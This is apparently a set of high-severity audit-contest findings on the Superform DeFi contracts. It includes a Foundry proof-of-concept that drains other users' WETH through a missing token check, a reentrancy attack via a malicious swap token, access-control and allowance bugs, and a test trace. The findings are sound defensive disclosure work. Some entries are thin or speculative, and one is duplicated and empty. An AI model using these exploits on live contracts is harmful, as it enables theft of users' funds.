## High risk
### deposits above the balance of SuperformRouter will always fail due to underflow.

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
This issue exists in the `SuperformRouter`'s deposit functions.

The calculation for the previous balance `balanceBefore` [here](https://cantina.xyz/ai/2cd0b038-3e32-4db6-b488-0f85b6f0e49f/superform-core/src/SuperformRouter.sol#L30), will always revert the tx whenever `msg.value` is a value higher than address(this).balance. 

So the calculation for the previous balance of the `SuperformRouter` in it's deposit functions will introduce a limit to the amount that can be deposited. 
Deposits above the balance of `SuperformRouter` will always fail due to underflow.


Here's a more vivid scenario: 

lets say some ETH was forcefully sent to `SuperformRouter`, (_this is because there's no way for an initial deposit without forcefully sending ETH to the `SuperformRouter` due to the calculation for prev balance in the deposit functions_)

Like for 1st deposit via any of the deposit functions, `address(this).balance` will be 0 so doing this `0 - msg.value` where msg.value would normally be a value > 0 will result in underflows causing reverts. So the only way an initial deposit is even possible in the `SuperformRouter` is by forcefully sending ETH so that there could be a balance.

but then that balance serves as a limit where deposits above the balance will always revert.

**Recommendation**:
i couldn't think of any possible solution to this as of now.





### Lack of Token Validation in Cross-Chain Deposit Flow

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- links :

- [superFormRouter](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol)
- [updateDepositPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L83C14-L83C34)
- [processPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L196)
- [\_singleDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L878)
- [xChainDepositIntoVault](https://github.com/superform-xyz/superform-core/blob/main/src/forms/ERC4626FormImplementation.sol#L246)

- Summary :

The cross-chain deposit flow lacks a crucial validation step to verify that the token deposited by the user matches the underlying asset of the target superForm. This gap allows a user to initiate an `xChainDeposit` with a less valuable token (e.g., dai) while providing a `superFormId` of a superForm with a more valuable underlying asset (e.g., WETH).resulting into this user depositing more value then he sent.

- Vulnerability Details :

The vulnerability unfolds as follows:

1. On the source chain, a user initiates an [singleXChainSingleVaultDeposit()](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L128) with any token and provides a `superFormId` of a superForm whose underlying asset is different then the token the user supplying and more valuable.

2. The [`superRouter`](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L128) conducts checks and, assuming no swap is set by the user supplied data (should be no swap in dstChain for this attack to work). The user's token is then farwarded through the bridge given to the `CoreStateRegistry` contract along with the message and its proofs.

3. Upon token arrival, the `CORE_STATE_REGISTRY_UPDATER_ROLE` keeper observes the amount received and updates the user's `payloadId` by calling [updateDepositPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L83C14-L83C34) after checking against the user given slippage .

   > as the sponsor said the keeper track the received amount of tokens to the dstChain and update it once it received in the coreStateRegistry .

4. The `CORE_STATE_REGISTRY_PROCESSOR_ROLE` keeper then came to process the payload by calling [`processPayload`](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L147). Given that the action is a deposit and the callback type is `INIT`, the [\_singleDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L878) function is executed within the `CoreStateRegistry` contract.

   ```js
   else if (txType == uint8(TransactionType.DEPOSIT)) {
                   if (initialState != PayloadState.UPDATED) {
                       revert Error.PAYLOAD_NOT_UPDATED();
                   }

                   returnMessage = isMulti == 1
                       ? _multiDeposit(payloadId_, payloadBody_, srcSender, srcChainId)
   >>               : _singleDeposit(payloadId_, payloadBody_, srcSender, srcChainId);
               }
   ```

5. The [\_singleDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L878) function retrieves the superForm address using the user-supplied `superFormId` from the source chain,and obtains the underlying asset via the `getVaultAsset()` function, and proceeds without validating the match between the user-supplied token and the superForm's underlying asset.

```js
  function _singleDeposit(uint256 payloadId_,bytes memory payload_,address srcSender_,uint64 srcChainIdfrom txData_ )internal
        returns (bytes memory){
            // decode the user supplied payload after the updated amount..
        InitSingleVaultData memory singleVaultData = abi.decode(payload_, (InitSingleVaultData));
        (address superform_,,) = singleVaultData.superformId.getSuperform();
    >>  IERC20 underlying = IERC20(IBaseForm(superform_).getVaultAsset());
    >>  if (underlying.balanceOf(address(this)) >= singleVaultData.amount) {
    >>      underlying.safeIncreaseAllowance(superform_, singleVaultData.amount);
    >>      try IBaseForm(superform_).xChainDepositIntoVault(singleVaultData, srcSender_, srcChainId_) returns (
                uint256 dstAmount
            ) {
    >>          if (dstAmount != 0 && !singleVaultData.retain4626) {
                    return _singleReturnData(
                        srcSender_,
                        singleVaultData.payloadId,
                        TransactionType.DEPOSIT,
                        CallbackType.RETURN,
                        singleVaultData.superformId,
                        dstAmount
                    );
                }
            } catch {
                // some code if deposit fail ..
        } else {
            revert Error.BRIDGE_TOKENS_PENDING();
        }
        return "";
    }
  }
```

note that the asset address is Obtained from the `superFormId` , and the contract check it's balance against this asset.also it's increasing the allowance for this asset , and then call [xChainDepositIntoVault](https://github.com/superform-xyz/superform-core/blob/main/src/forms/ERC4626FormImplementation.sol#L246) with the user `singleVaultData`. And till this point there is no check whatsoever if the user supplied token is the same as the underlying asset of the supplied `superFormId`.

- notice that in case of direct deposit the [\_directDepositIntoVault](https://github.com/superform-xyz/superform-core/blob/main/src/forms/ERC4626FormImplementation.sol#L156) function in the superForm contract, Handle this situation properly and check the token that in `singleVaultData` which is the token that the user supplied, against his asset, but this is not the case in crosschain deposit, the `xChainDepositIntoVault` function don't check the user-supplied token against the vault's underlying asset. it trust [coreStateRegistry]() and transfer from the amount that the user set.

```js
 function _processXChainDeposit(
        InitSingleVaultData memory singleVaultData_,
        uint64 srcChainId_
     )
        internal
        returns (uint256 dstAmount)
     {
        (,, uint64 dstChainId) = singleVaultData_.superformId.getSuperform();
        address vaultLoc = vault;
        IERC4626 v = IERC4626(vaultLoc);
    >>  IERC20(asset).safeTransferFrom(msg.sender, address(this), singleVaultData_.amount);
        IERC20(asset).safeIncreaseAllowance(vaultLoc, singleVaultData_.amount);
        if (singleVaultData_.retain4626) {
            dstAmount = v.deposit(singleVaultData_.amount, singleVaultData_.receiverAddress);
        } else {
            dstAmount = v.deposit(singleVaultData_.amount, address(this));
        }
        emit Processed(srcChainId_, dstChainId, singleVaultData_.payloadId, singleVaultData_.amount, vaultLoc);
    }

```

- `NOTICE` The only factor that could prevent this exploit is if the contract does not have the specific valuable asset chosen by the user at the time of the attack.but given that the contract frequently contains a mix of assets due to unprocessed deposits, pending withdrawals, failed deposit ..ect, it is highly probable that the contract has the necessary amount of a more valuable underlying asset at any given time.
- also even in failed deposits the token to be rescued will be the token of the vault which derived from the `supreFormId` given by the user.

- POC

- Scenario :

Assuming an attacker notices that the `CoreStateRegistry` contract on Arbitrum holds a balance of WETH (10), they could execute the following exploit:

1. The attacker initiates an `xChainDeposit` from Polygon to Arbitrum with 10 dai, while falsely specifying a `superFormId` for a superForm whose underlying asset is WETH.
2. the keeper track the transaction and assuming that 9 dai arrived, he update the amount to 9 (which is valid against user slippage).
3. The deposit is processed without validation, and due to the existing WETH balance on Arbitrum's `CoreStateRegistry`, the contract erroneously uses 9 WETH for the deposit into the vault associated with the provided `superFormId`.
4. As a result, the attacker is credited with shares or value corresponding to 9 WETH (Of course he will set `retainERC4626 = true`), despite having only deposited 10 dai , thus exploiting the system's lack of asset validation.

- i had some problems Compiling the testing setup in the repo so I made a Minimalistic setup Also i ignored the first part when the user sending the token from the srcChain I believe it's pretty clear that there is no validation there, i started from when the `coreStateRegistry` receives the payload. also I mock the `superRegistry` to avoid all Access control errors, and shows in the test that the `coreStateRegistry` are Completely depends on the given superFormId given by the user to derive the token to be deposited is this token and doesn't matter the user supplied token :

```js
 //SPDX-License-Identi MIT
pragma solidity ^0.8.23;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/SuperPositions.sol";
import {SuperformRouter} from "../src/SuperformRouter.sol";
import "../src/SuperformFactory.sol";
import "../src/forms/ERC4626Form.sol";
import "./mocks/VaultMock.sol";
import "./mocks/MockERC20.sol";
import "../src/crosschain-data/extensions/CoreStateRegistry.sol";
import "../src/interfaces/ISuperRegistry.sol";
contract superRegistryMock {
   // to skip the onlyminter param .
   address spr ;
   address factory;
    function getAddress(bytes32 v ) public view returns(address){
        if (v== keccak256("CORE_STATE_REGISTRY")) return spr;
        else if (v == keccak256("SUPERFORM_FACTORY")) return factory;

        return address(this);
    }
    function hasProtocolAdminRole(address admin_) external view returns (bool){
        return true;
    }
    function getStateRegistry(uint8 a) public view returns (address) {
        if (a == 1) return spr;
        return address(0);
    }
    function isValidAmbImpl(address) public view returns(bool){
        return true;
    }
    function hasRole(bytes32 id_, address addressToCheck_) public view returns(bool){
        return true;
    }
    function setCorestate(address _spr) public {
        spr = _spr;
    }

    function getRequiredMessagingQuorum(uint64) public view returns(uint) {
        return 0;
    }
    function setFactory(address f) public {
        factory =f ;
    }
}
contract setup_poc is Test{
    mapping (address => uint8) stateRegistryIds;
    superRegistryMock sr;
    SuperPositions sp;
    SuperformRouter superRouter;
    SuperformFactory factory;
    ERC4626Form impl;
    VaultMock vault;
    MockERC20 Weth;
    MockERC20 token;
    CoreStateRegistry coreState;
    uint superFormId;
    address superForm;

    function setUp() public {
        // deploy the tokens :
        Weth = new MockERC20("wrapped eth","weth",address(1223),1);
        token = new MockERC20("wrapped eth","weth",address(this),10 ether);
        // deploy the vault : and set the asset as the weth;
        vault = new VaultMock(Weth,"vault1","v1");
        // deploy superRegistry ;
        sr = new superRegistryMock();
        // deploy the implementation :
        impl = new ERC4626Form(address(sr));
        // deploy the factory and add the implementation :
        factory = new SuperformFactory(address(sr));
        sr.setFactory(address(factory));
        // add the implementation :
        factory.addFormImplementation(address(impl),1);
        // create a superform :
        (superFormId,superForm) = factory.createSuperform(1,address(vault));
        // deploy the coreStateRegistry ;
        coreState = new CoreStateRegistry(ISuperRegistry(address(sr)));
        sr.setCorestate(address(coreState));
        // simulate that the coreState have some weth of other users :
        Weth.mint(address(coreState),10 ether);
    }


   function test_callCoreState() public {
        // call the receivePayload sumilate the behavior of amb.(quorm is set to 0 for testing);
        coreState.receivePayload(111,initiateUserInput());
        // the keeper then came and update the amount (assuming arrived 9 token) :
        uint[] memory amounts = new uint[](1);
        amounts[0] = 9 ether;
        coreState.updateDepositPayload(1,amounts);
        // balance of coreState before :
        uint balanceBefore = Weth.balanceOf(address(coreState));
        console.log("coreState before weth balance : " ,balanceBefore);

        // the processor keeper then came and process the payload .
        coreState.processPayload(1);
        console.log("coreState remain weth balance : " ,balanceBefore - Weth.balanceOf(address(coreState)));
        console.log("user minted shares" , vault.balanceOf(address(this)));// address(this) is srcSender;
   }
    // this is the data that core state will receive after the msgDelivered :
    function initiateUserInput() public view returns (bytes memory ambMessage){
        // this is just the data after it get parsed and sent through the amb in xchainSingleDeposit():
        LiqRequest memory liq ;//empty
        bytes memory ambData = abi.encode(InitSingleVaultData(3,superFormId,10 ether,1000,liq,false,true,address(this),""));
        uint8[] memory ambIds = new uint8[](1);
        ambIds[0] = 1;
         ambMessage =  abi.encode(AMBMessage(DataLib.packTxInfo(
                uint8(TransactionType.DEPOSIT),
                uint8(CallbackType.INIT),
                0,
                1,
                address(this), // msg.sender
                111
            ), abi.encode(ambIds,ambData)));
    }
}
```

- Impact

- This vulnerability can be exploited to deposit assets into a vault that do not match the user's provided token, leading to the issuance of shares based on an incorrect asset and value. This can result in significant financial losses to other users.

- Recommendation

- I would recommend that the keeper update the token received from the user also not only the amount , so it can be compared To the targeted vault  asset.



### SuperPositions.onlyMinter() has wrong implementation, leading to wrong access control.

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
SuperPositions.onlyMinter() has wrong implemerantion, leading to wrong access control.

The problem is that the following implementation is comparing, the ``formImplementationId``, instead of the state registry ID for that superform to the state registry ID of msg.sender. 

[https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperPositions.sol#L69-L83](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperPositions.sol#L69-L83)

The correct comparison is to retrieve the state registry ID of the superform using function getStateRegistryId(), and then compare this id to the ID of msg.sender. 

Due to the wrong comparison, the implementation is wrong. As a result, any function uses this modifier will have the wrong access control, a serious security vulnerability. 

Similar problem exists for the modifier onlyBatchMinter().

**Recommendation**:
Compare the correct state registry id as follows:

```diff

    modifier onlyMinter(uint256 superformId) {
        address router = superRegistry.getAddress(keccak256("SUPERFORM_ROUTER"));

        /// if msg.sender isn't superformRouter then it must be state registry for that superform
        if (msg.sender != router) {
-            (, uint32 formBeaconId,) = DataLib.getSuperform(superformId);
(address superform_, uint32 formImplementationId_, uint64 chainId_) = DataLib.getSuperform(superformId);

+          uint8 formRegistryId = ERC4626FormImplementation(superform).getStateRegistryId();

            uint8 registryId = superRegistry.getStateRegistryId(msg.sender);

-            if (uint32(registryId != formBeaconId) {
+            if (registryId != formRegistryId) {

                revert Error.NOT_MINTER();
            }
        }

        _;
    }

```



### SuperformRouter::singleDirectSingleVaultDeposit reentrancy due to swap path enables to inflate balances in other vault shares

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
A malicious user Alice can create a vault having the shares of another vault as an asset. Then Alice can use a reentrancy in SuperformRouter to inflate the assets she provides to the vault, in order to extract the said shares from the router.

- Vulnerability Detail

We can see in `BaseForm::_processDirectDeposit`, that the asset tokens provided by the user are checked by doing a difference between an initial balance, and a final balance:

`BaseForm.sol`:
```solidity
    function _processDirectDeposit(InitSingleVaultData memory singleVaultData_) internal returns (uint256 dstAmount) {
        directDepositLocalVars memory vars;

        IERC4626 v = IERC4626(vault);
        vars.asset = address(asset);
>>      vars.balanceBefore = IERC20(vars.asset).balanceOf(address(this));
        IERC20 token = IERC20(singleVaultData_.liqData.token);

        //Token pulling/swapping logic
        ...

>>      vars.assetDifference = IERC20(vars.asset).balanceOf(address(this)) - vars.balanceBefore;

        //Depositing vars.assetDifference into underlying vault
        ...
    }

```

This is fine, but when we add the swapping logic we can see that Alice, can craft a multi-hop path for the swap which calls on a malicious token (`$PSN`) Alice created. The call on $PSN reenters `singleDirectSingleVaultDeposit` and deposits to the underlying vault by using `retain4626 == false`. Which will increase the assetDifference, but the outer call will be under the impression the new tokens are coming from the swap result, whereas they were already accounted for in the `inner` deposit.

As a result of this double accounting, Alice can withdraw the shares of vault from the superform she created, and as well withdraw from the already existing vault, since she deposited in the inner deposit.

- Impact
The vault shares contained in the SuperformRouter can be drained by a malicious user.

- Code Snippet

- Tool used

Manual Review

- Recommendation
Add a nonReentrant check on `SuperformRouter::singleDirectSingleVaultDeposit`



### Blockchain Identifier Manipulation in estimateFees Function

**Severity:** High risk

**Context:** [LayerzeroImplementation.sol#L173-L173](superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L173-L173)

**Description**:

this line  it relies on the ambChainId mapping  that is set by the protocol admin using the setChainId function. The ambChainId mapping maps the superform protocol chain ID to the AMB chain ID, which is used by the layerzero endpoint to identify the destination chain for cross-chain communication. The layerzero endpoint is a trusted third party that can potentially change the value of the AMB chain ID without your consent. and this can affect the logic of the contract that relies on the chain ID to estimate the fees for sending a message to another chain. let's say that if the contract expects to send a message to chain ID 1, but the layerzero endpoint changes it to 2, the contract will estimate the fees based on the wrong chain ID.
An attacker can exploit this vulnerability by compromising the layerzero endpoint or the protocol admin, and changing the value of the AMB chain ID for a given superform protocol chain ID.  and this allow the attacker to manipulate the fees estimation and cause the contract to overpay or underpay for the cross-chain communication. as a result can cause loss of funds.

**Recommendation**:

it's better to not rely on the ambChainId mapping or the layerzero endpoint to get the correct chain ID, instead of that it's should use  a hash of the chain's genesis block or a public key of the chain's authority and also check the return value of the lzEndpoint.send function to ensure the message was sent successfully



### Incorrect allowance decrement in safeBatchTransferFrom function

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
In `safeBatchTransferFrom` function of `ERC1155A` contract instead of decrementing msg.sender's allowance receiver's allowance is being decremented.

- 





### Incorrect allowance decrement in safeBatchTransferFrom function

**Severity:** High risk

**Context:** [ERC1155A.sol#L140-L145](ERC1155A/src/ERC1155A.sol#L140-L145)

- Summary
In `safeBatchTransferFrom` function of `ERC1155A` contract instead of decrementing msg.sender's allowance receiver's allowance is being decremented.

- Proof Of Concept
1. Let's say Alice has 100 super position tokens.
2. Alice gave 5 Tokens allowance to Bob.
3. Alice also gave infinite approval(type(uint256).max) to a smart contract X which can pull tokens from Alice when she calls a specific function.
4. Now Bob can use his 5 Tokens allowance to lock all the Alice's tokens by transferring all of them to the smart contract X by providing the smart contract address as to address.



- Impact 
A malicious allowee can lock all the tokens of the owner.

- Recommendation

Instead of decrementing receivers allowance decrement msg.sender's allowance in safeBatchTransferFrom function.

```diff
         if (singleApproval) {
               if (allowance(from, msg.sender, id) < amount) revert NOT_ENOUGH_ALLOWANCE();
-              allowances[from][to][id] -= amount;
+             allowances[from][msg.sender][id] -= amount;
            }
```



### Invalid check for `onERC1155BatchReceived` by `singleDirectSingleVaultDeposit`

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:


When using the `singleDirectSingleVaultDeposit` function to `mint` a `SuperPosition` for the contract account, if the contract account does not implement the `onERC1155Received` function, the function execution is also successful.


- poc
```
// 1. add mockUser.sol test\unit\emergency\mockUser.sol

// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.23;
import { IERC1155Receiver } from "openzeppelin-contracts/contracts/token/ERC1155/IERC1155Receiver.sol";
import { IERC1155 } from "openzeppelin-contracts/contracts/token/ERC1155/IERC1155.sol";

contract MorkUser is IERC1155Receiver{
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external override returns (bytes4) {
        return bytes4("");
    }
        function supportsInterface(bytes4 interfaceId) 
    public pure override 
    returns (bool) {
        return interfaceId == type(IERC1155).interfaceId;
    }
    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    )
    public override
    returns(bytes4){
        return bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"));
    }
}

// 2.change EmergencyQueueTest  test\unit\emergency\EmergencyQueue.t.sol

// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.23;

import "test/utils/ProtocolActions.sol";

import { KYCDaoNFTMock } from "test/mocks/KYCDaoNFTMock.sol";
import { ISuperRegistry } from "src/interfaces/ISuperRegistry.sol";
import { LayerzeroImplementation } from "src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol";
import "test/unit/emergency/mockUser.sol";


contract EmergencyQueueTest is ProtocolActions {
    /// our intended user who is a nice person
    address mrperfect;
    /// our users who is a friend of nice person that wants the refunds
    address mrimperfect;

    address morkUser;
    function setUp() public override {
        super.setUp();

        mrperfect = vm.addr(421);
        mrimperfect = vm.addr(420);
        morkUser = address(new MorkUser());
    }
		.....

function _withdrawAfterPause() internal {
        vm.selectFork(FORKS[ETH]);
        address payable router = payable(getContract(ETH, "SuperformRouter"));
        address superPositions = getContract(ETH, "SuperPositions");

        SingleVaultSFData memory data = SingleVaultSFData(
            _getTestSuperformId(),
            1e18,
            100,
            LiqRequest("", getContract(ETH, "DAI"), address(0), 1, ETH, 0),
            "",
            false,
            false,
            // mrimperfect,
            morkUser,
            ""
        );

        SingleDirectSingleVaultStateReq memory req = SingleDirectSingleVaultStateReq(data);

        vm.prank(morkUser);
        SuperPositions(superPositions).increaseAllowance(router, _getTestSuperformId(), 100e18);

        vm.prank(morkUser);
        SuperformRouter(router).singleDirectSingleVaultWithdraw(req);

        vm.prank(morkUser);
        SuperformRouter(router).singleDirectSingleVaultWithdraw(req);

        assertEq(EmergencyQueue(getContract(ETH, "EmergencyQueue")).queueCounter(), 2);
    }


function _successfulDeposit() internal {
        if(morkUser.code.length > 0 ) { // entry this
            vm.selectFork(FORKS[ETH]);
            address dai = getContract(ETH, "DAI");
            vm.prank(deployer);
            MockERC20(dai).transfer(morkUser, 2e18);


            vm.startPrank(morkUser);
            address superformRouter = getContract(ETH, "SuperformRouter");
            uint256 superformId = _getTestSuperformId();

            SingleVaultSFData memory data = SingleVaultSFData(
                superformId, 2e18, 100, LiqRequest("", dai, address(0), 1, 1, 0), "", false, false, morkUser, ""
            );

            SingleDirectSingleVaultStateReq memory req = SingleDirectSingleVaultStateReq(data);

            /// @dev approves before call
            MockERC20(dai).approve(address(superformRouter), 2e18);

            SuperformRouter(payable(superformRouter)).singleDirectSingleVaultDeposit(req);
            vm.stopPrank();
        }else{
            revert();
        }
    }

// 3. for debug  lib\ERC1155A\src\ERC1155A.sol
function _doSafeTransferAcceptanceCheck(
        address operator,
        address from,
        address to,
        uint256 id,
        uint256 value,
        bytes memory data
    )
        private
    {
         emit TransferSingle(operator, from, address(to), id, value);// for debug
        if (to.code.length > 0) {
            try IERC1155Receiver(to).onERC1155Received(operator, from, id, value, data) returns (bytes4 response) {
                if (response != IERC1155Receiver.onERC1155Received.selector) {
                    // Tokens rejected
                    revert ERC1155InvalidReceiver(to);
                }
            } catch (bytes memory reason) {
                if (reason.length == 0) {
                    // non-ERC1155Receiver implementer
                    revert ERC1155InvalidReceiver(to);
                } else {
                    /// @solidity memory-safe-assembly
                    assembly {
                        revert(add(32, reason), mload(reason))
                    }
                }
            }
        } else {
            if (to == address(0)) revert TRANSFER_TO_ADDRESS_ZERO();
        }
    }

// 4. forge test --match-test test_emergencyQueueAddition -vvvvv
// log
[613434] EmergencyQueueTest::test_emergencyQueueAddition()
    ├─ [0] VM::selectFork(0)
    │   └─ ← ()
    ├─ [0] VM::prank(0x7121207b118BbaCF0340A989527474Bd4495c3C6)
    │   └─ ← ()
    ├─ [25374] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2000000000000000000 [2e18])
    │   ├─ emit Transfer(from: 0x7121207b118BbaCF0340A989527474Bd4495c3C6, to: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 2000000000000000000 [2e18])
    │   └─ ← true
    ├─ [0] VM::startPrank(MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← ()
    ├─ [24514] 0x6B175474E89094C44Da98b954EedeAC495271d0F::approve(SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], 2000000000000000000 [2e18])
    │   ├─ emit Approval(owner: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], value: 2000000000000000000 [2e18])
    │   └─ ← true
    ├─ [234282] SuperformRouter::singleDirectSingleVaultDeposit(SingleDirectSingleVaultStateReq({ superformData: SingleVaultSFData({ superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 2000000000000000000 [2e18], maxSlippage: 100, liqRequest: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), permit2data: 0x, hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }) }))
    │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   ├─ [885] SuperformFactory::isSuperform(6277101737765918987192496495433682268394204163361895557506 [6.277e57]) [staticcall]
    │   │   └─ ← true
    │   ├─ [2965] SuperformFactory::isFormImplementationPaused(1) [staticcall]
    │   │   └─ ← false
    │   ├─ [677] 0x6B175474E89094C44Da98b954EedeAC495271d0F::allowance(MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9]) [staticcall]
    │   │   └─ ← 2000000000000000000 [2e18]
    │   ├─ [21340] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transferFrom(MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], 2000000000000000000 [2e18])
    │   │   ├─ emit Transfer(from: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], value: 2000000000000000000 [2e18])
    │   │   └─ ← true
    │   ├─ [2677] 0x6B175474E89094C44Da98b954EedeAC495271d0F::allowance(SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], 0xA0c0Bb570A68de6109510C3D59443808B7572982) [staticcall]
    │   │   └─ ← 0
    │   ├─ [22414] 0x6B175474E89094C44Da98b954EedeAC495271d0F::approve(0xA0c0Bb570A68de6109510C3D59443808B7572982, 2000000000000000000 [2e18])    
    │   │   ├─ emit Approval(owner: SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], spender: 0xA0c0Bb570A68de6109510C3D59443808B7572982, value: 2000000000000000000 [2e18])
    │   │   └─ ← true
    │   ├─ [127450] 0xA0c0Bb570A68de6109510C3D59443808B7572982::directDepositIntoVault(InitSingleVaultData({ payloadId: 0, superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 2000000000000000000 [2e18], maxSlippage: 100, liqData: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }), MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [127226] ERC4626Form::directDepositIntoVault(InitSingleVaultData({ payloadId: 0, superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 2000000000000000000 [2e18], maxSlippage: 100, liqData: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }), MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0x3a2f5529773e03d975be44bdae98a8509bdf1159e407504e558536cde56cf6ac) [staticcall]
    │   │   │   │   └─ ← SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9]
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   │   │   ├─ [885] SuperformFactory::isSuperform(6277101737765918987192496495433682268394204163361895557506 [6.277e57]) [staticcall]        
    │   │   │   │   └─ ← true
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   │   │   ├─ [965] SuperformFactory::isFormImplementationPaused(1) [staticcall]
    │   │   │   │   └─ ← false
    │   │   │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xA0c0Bb570A68de6109510C3D59443808B7572982) [staticcall]
    │   │   │   │   └─ ← 0
    │   │   │   ├─ [677] 0x6B175474E89094C44Da98b954EedeAC495271d0F::allowance(SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], 0xA0c0Bb570A68de6109510C3D59443808B7572982) [staticcall]
    │   │   │   │   └─ ← 2000000000000000000 [2e18]
    │   │   │   ├─ [19740] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transferFrom(SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], 0xA0c0Bb570A68de6109510C3D59443808B7572982, 2000000000000000000 [2e18])
    │   │   │   │   ├─ emit Transfer(from: SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], to: 0xA0c0Bb570A68de6109510C3D59443808B7572982, value: 2000000000000000000 [2e18])
    │   │   │   │   └─ ← true
    │   │   │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xA0c0Bb570A68de6109510C3D59443808B7572982) [staticcall]
    │   │   │   │   └─ ← 2000000000000000000 [2e18]
    │   │   │   ├─ [2677] 0x6B175474E89094C44Da98b954EedeAC495271d0F::allowance(0xA0c0Bb570A68de6109510C3D59443808B7572982, VaultMock: [0x888A2b1728fCbAFa7958e9040a1bBf043dD31450]) [staticcall]
    │   │   │   │   └─ ← 0
